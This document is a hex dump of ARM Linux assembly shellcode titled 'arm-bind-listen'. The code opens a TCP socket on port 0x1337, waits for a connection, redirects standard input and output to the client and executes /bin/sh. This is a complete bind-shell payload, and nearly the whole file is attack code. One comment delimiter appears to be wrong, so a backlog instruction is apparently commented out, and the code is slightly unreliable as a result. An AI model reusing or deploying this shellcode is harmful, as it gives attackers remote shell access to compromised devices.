00000000  2f 2a 0d 0a 20 2a 20 54  69 74 6c 65 3a 20 61 72  |/*.. * Title: ar|
00000010  6d 2d 62 69 6e 64 2d 6c  69 73 74 65 6e 0d 0a 20  |m-bind-listen.. |
00000020  2a 20 42 72 69 65 66 3a  20 42 69 6e 64 20 61 20  |* Brief: Bind a |
00000030  73 68 65 6c 6c 20 74 6f  20 70 6f 72 74 20 30 78  |shell to port 0x|
00000040  31 33 33 37 20 6f 6e 20  61 6e 79 20 6c 6f 63 61  |1337 on any loca|
00000050  6c 20 61 64 64 72 65 73  73 20 61 6e 64 0d 0a 20  |l address and.. |
00000060  2a 20 20 20 20 20 20 20  20 77 61 69 74 20 66 6f  |*        wait fo|
00000070  72 20 63 6f 6e 6e 65 63  74 69 6f 6e 73 0d 0a 20  |r connections.. |
00000080  2a 20 41 75 74 68 6f 72  3a 20 44 61 6e 69 65 6c  |* Author: Daniel|
00000090  20 47 6f 64 61 73 2d 4c  6f 70 65 7a 20 3c 67 6d  | Godas-Lopez <gm|
000000a0  61 69 6c 20 61 63 63 6f  75 6e 74 20 64 67 6f 64  |ail account dgod|
000000b0  61 73 3e 0d 0a 20 2a 2f  0d 0a 20 0d 0a 20 20 20  |as>.. */.. ..   |
000000c0  20 2f 2a 0d 0a 20 20 20  20 20 20 73 6f 63 5f 64  | /*..      soc_d|
000000d0  65 73 20 3d 20 73 6f 63  6b 65 74 28 41 46 5f 49  |es = socket(AF_I|
000000e0  4e 45 54 2c 20 53 4f 43  4b 5f 53 54 52 45 41 4d  |NET, SOCK_STREAM|
000000f0  2c 20 49 50 50 52 4f 54  4f 5f 54 43 50 29 3b 0d  |, IPPROTO_TCP);.|
00000100  0a 20 20 20 20 20 2a 2f  0d 0a 20 0d 0a 20 20 20  |.     */.. ..   |
00000110  20 6d 6f 76 20 25 72 30  2c 20 24 32 20 20 20 20  | mov %r0, $2    |
00000120  20 2f 2a 20 41 46 5f 49  4e 45 54 20 2a 2f 0d 0a  | /* AF_INET */..|
00000130  20 20 20 20 6d 6f 76 20  25 72 31 2c 20 24 31 20  |    mov %r1, $1 |
00000140  20 20 20 20 2f 2a 20 53  4f 43 4b 5f 53 54 52 45  |    /* SOCK_STRE|
00000150  41 4d 20 2a 2f 0d 0a 20  20 20 20 6d 6f 76 20 25  |AM */..    mov %|
00000160  72 32 2c 20 24 36 20 20  20 20 20 2f 2a 20 49 50  |r2, $6     /* IP|
00000170  50 52 54 4f 54 4f 5f 54  43 50 20 2a 2f 0d 0a 20  |PRTOTO_TCP */.. |
00000180  20 20 20 70 75 73 68 20  7b 25 72 30 2c 20 25 72  |   push {%r0, %r|
00000190  31 2c 20 25 72 32 7d 0d  0a 20 20 20 20 6d 6f 76  |1, %r2}..    mov|
000001a0  20 25 72 30 2c 20 24 31  20 20 20 20 20 2f 2a 20  | %r0, $1     /* |
000001b0  73 6f 63 6b 65 74 20 2a  2f 0d 0a 20 20 20 20 6d  |socket */..    m|
000001c0  6f 76 20 25 72 31 2c 20  25 73 70 0d 0a 20 20 20  |ov %r1, %sp..   |
000001d0  20 73 76 63 20 30 78 30  30 39 30 30 30 36 36 0d  | svc 0x00900066.|
000001e0  0a 20 20 20 20 61 64 64  20 25 73 70 2c 20 25 73  |.    add %sp, %s|
000001f0  70 2c 20 24 31 32 0d 0a  20 0d 0a 20 20 20 20 6d  |p, $12.. ..    m|
00000200  6f 76 20 25 72 36 2c 20  25 72 30 20 20 20 20 20  |ov %r6, %r0     |
00000210  20 20 20 2f 2a 20 72 36  20 3d 20 73 6f 63 5f 64  |   /* r6 = soc_d|
00000220  65 73 20 2a 2f 0d 0a 20  0d 0a 20 20 20 20 2f 2a  |es */.. ..    /*|
00000230  0d 0a 20 20 20 20 20 20  62 69 6e 64 28 73 6f 63  |..      bind(soc|
00000240  5f 64 65 73 2c 20 28 73  74 72 75 63 74 20 73 6f  |_des, (struct so|
00000250  63 6b 61 64 64 72 20 2a  29 20 26 73 65 72 76 5f  |ckaddr *) &serv_|
00000260  61 64 64 72 2c 20 73 69  7a 65 6f 66 28 73 65 72  |addr, sizeof(ser|
00000270  76 5f 61 64 64 72 29 29  3b 0d 0a 20 20 20 20 20  |v_addr));..     |
00000280  2a 2f 0d 0a 20 0d 0a 2e  69 66 20 30 20 2f 2a 20  |*/.. ...if 0 /* |
00000290  72 30 20 3d 3d 20 72 36  20 61 6c 72 65 61 64 79  |r0 == r6 already|
000002a0  20 2a 2f 0d 0a 20 20 20  20 6d 6f 76 20 25 72 30  | */..    mov %r0|
000002b0  2c 20 25 72 36 20 20 20  20 20 20 20 20 2f 2a 20  |, %r6        /* |
000002c0  73 6f 63 5f 64 65 73 20  2a 2f 0d 0a 2e 65 6e 64  |soc_des */...end|
000002d0  69 66 0d 0a 20 0d 0a 20  20 20 20 6d 6f 76 20 25  |if.. ..    mov %|
000002e0  72 31 2c 20 24 30 78 33  37 0d 0a 20 20 20 20 6d  |r1, $0x37..    m|
000002f0  6f 76 20 25 72 37 2c 20  24 30 78 31 33 0d 0a 20  |ov %r7, $0x13.. |
00000300  20 20 20 6d 6f 76 20 25  72 31 2c 20 25 72 31 2c  |   mov %r1, %r1,|
00000310  20 6c 73 6c 20 24 32 34  0d 0a 20 20 20 20 61 64  | lsl $24..    ad|
00000320  64 20 25 72 31 2c 20 25  72 37 2c 20 6c 73 6c 20  |d %r1, %r7, lsl |
00000330  24 31 36 0d 0a 20 20 20  20 61 64 64 20 25 72 31  |$16..    add %r1|
00000340  2c 20 24 32 20 20 20 20  20 2f 2a 20 70 6f 72 74  |, $2     /* port|
00000350  20 3d 20 30 78 31 33 33  37 2c 20 66 61 6d 69 6c  | = 0x1337, famil|
00000360  79 20 3d 20 32 20 28 41  46 5f 49 4e 45 54 29 20  |y = 2 (AF_INET) |
00000370  2a 2f 0d 0a 20 20 20 20  73 75 62 20 25 72 32 2c  |*/..    sub %r2,|
00000380  20 25 72 32 2c 20 25 72  32 20 20 20 2f 2a 20 61  | %r2, %r2   /* a|
00000390  64 64 72 20 3d 20 30 2e  30 2e 30 2e 30 20 2a 2f  |ddr = 0.0.0.0 */|
000003a0  0d 0a 20 20 20 20 70 75  73 68 20 7b 25 72 31 2c  |..    push {%r1,|
000003b0  20 25 72 32 7d 0d 0a 20  20 20 20 6d 6f 76 20 25  | %r2}..    mov %|
000003c0  72 31 2c 20 25 73 70 20  20 20 20 20 20 20 20 2f  |r1, %sp        /|
000003d0  2a 20 70 6f 69 6e 74 65  72 20 74 6f 20 73 6f 63  |* pointer to soc|
000003e0  6b 61 64 64 72 5f 69 6e  20 2a 2f 0d 0a 20 20 20  |kaddr_in */..   |
000003f0  20 6d 6f 76 20 25 72 32  2c 20 24 31 36 20 20 20  | mov %r2, $16   |
00000400  20 20 20 20 20 2f 2a 20  73 69 7a 65 6f 66 28 73  |     /* sizeof(s|
00000410  74 72 75 63 74 20 73 6f  63 6b 61 64 64 72 5f 69  |truct sockaddr_i|
00000420  6e 29 20 2a 2f 0d 0a 20  20 20 20 20 0d 0a 20 20  |n) */..     ..  |
00000430  20 20 70 75 73 68 20 7b  25 72 30 2c 20 25 72 31  |  push {%r0, %r1|
00000440  2c 20 25 72 32 7d 0d 0a  20 20 20 20 6d 6f 76 20  |, %r2}..    mov |
00000450  25 72 30 2c 20 24 32 20  20 20 20 20 2f 2a 20 62  |%r0, $2     /* b|
00000460  69 6e 64 20 2a 2f 0d 0a  20 20 20 20 6d 6f 76 20  |ind */..    mov |
00000470  25 72 31 2c 20 25 73 70  0d 0a 20 20 20 20 73 76  |%r1, %sp..    sv|
00000480  63 20 30 78 30 30 39 30  30 30 36 36 0d 0a 20 20  |c 0x00900066..  |
00000490  20 20 61 64 64 20 25 73  70 2c 20 25 73 70 2c 20  |  add %sp, %sp, |
000004a0  24 32 30 0d 0a 20 0d 0a  20 20 20 20 2f 2a 0d 0a  |$20.. ..    /*..|
000004b0  20 20 20 20 20 20 6c 69  73 74 65 6e 28 73 6f 63  |      listen(soc|
000004c0  5f 64 65 73 2c 20 31 29  3b 0d 0a 20 20 20 20 20  |_des, 1);..     |
000004d0  2f 2a 0d 0a 20 0d 0a 20  20 20 20 6d 6f 76 20 25  |/*.. ..    mov %|
000004e0  72 31 2c 20 24 31 20 20  20 20 20 2f 2a 20 62 61  |r1, $1     /* ba|
000004f0  63 6b 6c 6f 67 20 28 73  65 65 20 6d 61 6e 20 32  |cklog (see man 2|
00000500  20 6c 69 73 74 65 6e 29  20 2a 2f 0d 0a 20 20 20  | listen) */..   |
00000510  20 6d 6f 76 20 25 72 30  2c 20 25 72 36 20 20 20  | mov %r0, %r6   |
00000520  20 20 20 20 20 2f 2a 20  73 6f 63 5f 64 65 73 20  |     /* soc_des |
00000530  2a 2f 0d 0a 20 20 20 20  70 75 73 68 20 7b 25 72  |*/..    push {%r|
00000540  30 2c 20 25 72 31 7d 0d  0a 20 20 20 20 6d 6f 76  |0, %r1}..    mov|
00000550  20 25 72 30 2c 20 24 34  20 20 20 20 20 2f 2a 20  | %r0, $4     /* |
00000560  6c 69 73 74 65 6e 20 2a  2f 0d 0a 20 20 20 20 6d  |listen */..    m|
00000570  6f 76 20 25 72 31 2c 20  25 73 70 0d 0a 20 20 20  |ov %r1, %sp..   |
00000580  20 73 76 63 20 30 78 30  30 39 30 30 30 36 36 0d  | svc 0x00900066.|
00000590  0a 20 20 20 20 61 64 64  20 25 73 70 2c 20 24 38  |.    add %sp, $8|
000005a0  0d 0a 20 0d 0a 20 20 20  20 2f 2a 0d 0a 20 20 20  |.. ..    /*..   |
000005b0  20 20 20 73 6f 63 5f 63  6c 69 20 3d 20 61 63 63  |   soc_cli = acc|
000005c0  65 70 74 28 73 6f 63 5f  64 65 73 2c 20 30 2c 20  |ept(soc_des, 0, |
000005d0  30 29 3b 0d 0a 20 20 20  20 20 2a 2f 0d 0a 20 0d  |0);..     */.. .|
000005e0  0a 20 20 20 20 6d 6f 76  20 25 72 30 2c 20 25 72  |.    mov %r0, %r|
000005f0  36 20 20 20 20 20 20 20  20 2f 2a 20 73 6f 63 5f  |6        /* soc_|
00000600  64 65 73 20 2a 2f 0d 0a  20 20 20 20 73 75 62 20  |des */..    sub |
00000610  25 72 31 2c 20 25 72 31  2c 20 25 72 31 0d 0a 20  |%r1, %r1, %r1.. |
00000620  20 20 20 73 75 62 20 25  72 32 2c 20 25 72 32 2c  |   sub %r2, %r2,|
00000630  20 25 72 32 0d 0a 20 20  20 20 70 75 73 68 20 7b  | %r2..    push {|
00000640  25 72 30 2c 20 25 72 31  2c 20 25 72 32 7d 0d 0a  |%r0, %r1, %r2}..|
00000650  20 20 20 20 6d 6f 76 20  25 72 30 2c 20 24 35 20  |    mov %r0, $5 |
00000660  20 20 20 20 2f 2a 20 61  63 63 65 70 74 20 2a 2f  |    /* accept */|
00000670  0d 0a 20 20 20 20 6d 6f  76 20 25 72 31 2c 20 25  |..    mov %r1, %|
00000680  73 70 0d 0a 20 20 20 20  73 76 63 20 30 78 30 30  |sp..    svc 0x00|
00000690  39 30 30 30 36 36 0d 0a  20 20 20 20 61 64 64 20  |900066..    add |
000006a0  25 73 70 2c 20 25 73 70  2c 20 24 31 32 0d 0a 20  |%sp, %sp, $12.. |
000006b0  0d 0a 20 20 20 20 6d 6f  76 20 25 72 36 2c 20 25  |..    mov %r6, %|
000006c0  72 30 20 20 20 20 20 20  20 20 2f 2a 20 72 36 20  |r0        /* r6 |
000006d0  3d 20 73 6f 63 5f 63 6c  69 20 2a 2f 0d 0a 20 0d  |= soc_cli */.. .|
000006e0  0a 20 20 20 20 2f 2a 0d  0a 20 20 20 20 20 20 64  |.    /*..      d|
000006f0  75 70 32 28 73 6f 63 5f  63 6c 69 2c 30 29 3b 0d  |up2(soc_cli,0);.|
00000700  0a 20 20 20 20 20 20 64  75 70 32 28 73 6f 63 5f  |.      dup2(soc_|
00000710  63 6c 69 2c 31 29 3b 0d  0a 20 20 20 20 20 20 64  |cli,1);..      d|
00000720  75 70 32 28 73 6f 63 5f  63 6c 69 2c 32 29 3b 0d  |up2(soc_cli,2);.|
00000730  0a 20 20 20 20 20 2a 2f  0d 0a 20 20 20 20 6d 6f  |.     */..    mo|
00000740  76 20 25 72 31 2c 20 24  32 0d 0a 31 3a 20 20 6d  |v %r1, $2..1:  m|
00000750  6f 76 20 25 72 30 2c 20  25 72 36 0d 0a 20 20 20  |ov %r0, %r6..   |
00000760  20 73 76 63 20 30 78 30  30 39 30 30 30 33 66 0d  | svc 0x0090003f.|
00000770  0a 20 20 20 20 73 75 62  73 20 25 72 31 2c 20 25  |.    subs %r1, %|
00000780  72 31 2c 20 24 31 0d 0a  20 20 20 20 62 70 6c 20  |r1, $1..    bpl |
00000790  31 62 0d 0a 20 0d 0a 20  20 20 20 2f 2a 0d 0a 20  |1b.. ..    /*.. |
000007a0  20 20 20 20 20 65 78 65  63 76 65 28 22 2f 62 69  |     execve("/bi|
000007b0  6e 2f 73 68 22 2c 20 70  61 72 6d 73 2c 20 65 6e  |n/sh", parms, en|
000007c0  76 29 3b 0d 0a 20 20 20  20 20 2a 2f 0d 0a 20 0d  |v);..     */.. .|
000007d0  0a 20 20 20 20 73 75 62  20 25 72 31 2c 20 25 73  |.    sub %r1, %s|
000007e0  70 2c 20 24 34 20 20 20  20 2f 2a 20 61 72 67 76  |p, $4    /* argv|
000007f0  5b 30 5d 20 3d 20 22 73  68 22 20 2a 2f 0d 0a 20  |[0] = "sh" */.. |
00000800  20 20 20 73 75 62 20 25  72 32 2c 20 25 72 32 2c  |   sub %r2, %r2,|
00000810  20 25 72 32 20 20 20 2f  2a 20 61 72 67 76 5b 31  | %r2   /* argv[1|
00000820  5d 20 3d 20 30 78 30 30  30 30 30 30 30 30 20 2a  |] = 0x00000000 *|
00000830  2f 0d 0a 20 20 20 20 6d  6f 76 20 25 72 33 2c 20  |/..    mov %r3, |
00000840  24 30 78 32 66 0d 0a 20  20 20 20 6d 6f 76 20 25  |$0x2f..    mov %|
00000850  72 37 2c 20 24 30 78 36  32 0d 0a 20 20 20 20 61  |r7, $0x62..    a|
00000860  64 64 20 25 72 33 2c 20  25 72 37 2c 20 6c 73 6c  |dd %r3, %r7, lsl|
00000870  20 24 38 0d 0a 20 20 20  20 6d 6f 76 20 25 72 37  | $8..    mov %r7|
00000880  2c 20 24 30 78 36 39 0d  0a 20 20 20 20 61 64 64  |, $0x69..    add|
00000890  20 25 72 33 2c 20 25 72  37 2c 20 6c 73 6c 20 24  | %r3, %r7, lsl $|
000008a0  31 36 0d 0a 20 20 20 20  6d 6f 76 20 25 72 37 2c  |16..    mov %r7,|
000008b0  20 24 30 78 36 65 0d 0a  20 20 20 20 61 64 64 20  | $0x6e..    add |
000008c0  25 72 33 2c 20 25 72 37  2c 20 6c 73 6c 20 24 32  |%r3, %r7, lsl $2|
000008d0  34 20 20 20 2f 2a 20 27  2f 27 20 20 27 62 27 20  |4   /* '/'  'b' |
000008e0  20 27 69 27 20 20 27 6e  27 20 20 2a 2f 0d 0a 20  | 'i'  'n'  */.. |
000008f0  20 20 20 6d 6f 76 20 25  72 34 2c 20 24 30 78 32  |   mov %r4, $0x2|
00000900  66 0d 0a 20 20 20 20 6d  6f 76 20 25 72 37 2c 20  |f..    mov %r7, |
00000910  24 30 78 37 33 0d 0a 20  20 20 20 61 64 64 20 25  |$0x73..    add %|
00000920  72 34 2c 20 25 72 37 2c  20 6c 73 6c 20 24 38 0d  |r4, %r7, lsl $8.|
00000930  0a 20 20 20 20 6d 6f 76  20 25 72 37 2c 20 24 30  |.    mov %r7, $0|
00000940  78 36 38 0d 0a 20 20 20  20 61 64 64 20 25 72 34  |x68..    add %r4|
00000950  2c 20 25 72 37 2c 20 6c  73 6c 20 24 31 36 20 20  |, %r7, lsl $16  |
00000960  20 2f 2a 20 27 2f 27 20  20 27 73 27 20 20 27 68  | /* '/'  's'  'h|
00000970  27 20 20 30 78 30 30 20  2a 2f 0d 0a 20 20 20 20  |'  0x00 */..    |
00000980  6d 6f 76 20 25 72 35 2c  20 24 30 78 37 33 0d 0a  |mov %r5, $0x73..|
00000990  20 20 20 20 6d 6f 76 20  25 72 37 2c 20 24 30 78  |    mov %r7, $0x|
000009a0  36 38 0d 0a 20 20 20 20  61 64 64 20 25 72 35 2c  |68..    add %r5,|
000009b0  20 25 72 37 2c 20 6c 73  6c 20 24 38 20 20 20 20  | %r7, lsl $8    |
000009c0  2f 2a 20 27 73 27 20 20  27 68 27 20 20 30 78 30  |/* 's'  'h'  0x0|
000009d0  30 20 30 78 30 30 20 2a  2f 0d 0a 20 0d 0a 20 20  |0 0x00 */.. ..  |
000009e0  20 20 70 75 73 68 20 7b  25 72 31 2c 20 25 72 32  |  push {%r1, %r2|
000009f0  2c 20 25 72 33 2c 20 25  72 34 2c 20 25 72 35 7d  |, %r3, %r4, %r5}|
00000a00  0d 0a 20 0d 0a 20 20 20  20 61 64 64 20 25 72 30  |.. ..    add %r0|
00000a10  2c 20 25 73 70 2c 20 24  38 20 20 20 20 2f 2a 20  |, %sp, $8    /* |
00000a20  66 69 6c 65 6e 61 6d 65  20 70 74 72 20 2a 2f 0d  |filename ptr */.|
00000a30  0a 20 20 20 20 61 64 64  20 25 72 31 2c 20 25 73  |.    add %r1, %s|
00000a40  70 2c 20 24 30 20 20 20  20 2f 2a 20 61 72 67 76  |p, $0    /* argv|
00000a50  20 70 74 72 20 2a 2f 0d  0a 20 20 20 20 61 64 64  | ptr */..    add|
00000a60  20 25 72 32 2c 20 25 73  70 2c 20 24 34 20 20 20  | %r2, %sp, $4   |
00000a70  20 2f 2a 20 65 6e 76 20  70 74 72 20 2a 2f 0d 0a  | /* env ptr */..|
00000a80  20 0d 0a 20 20 20 20 73  76 63 20 30 78 30 30 39  | ..    svc 0x009|
00000a90  30 30 30 30 62                                    |0000b|
00000a95
